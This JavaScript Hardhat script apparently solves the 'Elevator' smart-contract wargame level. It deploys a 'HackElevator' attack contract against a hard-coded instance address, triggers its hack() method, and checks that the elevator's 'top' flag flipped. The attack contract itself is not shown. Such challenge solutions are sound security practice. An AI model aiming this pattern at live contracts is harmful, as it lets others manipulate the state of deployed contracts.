const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const Elevator = await ethers.getContractFactory("Elevator");
    const HackElevator = await ethers.getContractFactory("HackElevator");

    // Deploy the HackElevator contract
    console.log('Deploying the HackElevator contract');
    contract = await HackElevator.deploy(instance_address);
    await contract.deployed();
    console.log(`Contract address: ${contract.address}`);

    let elevator = Elevator.attach(instance_address);

    console.log(`Elevator at top floor: ${await elevator.top()}`);

    // Call the hack method
    console.log('Hacking...');
    let tx = await contract.hack();
    console.log('Waiting for 10 confirmations...');
    await tx.wait(10);

    console.log(`Elevator at top floor: ${await elevator.top()}`);

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x5515dCBeFF8EF703710c0a177BC2862eAd7D8312';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
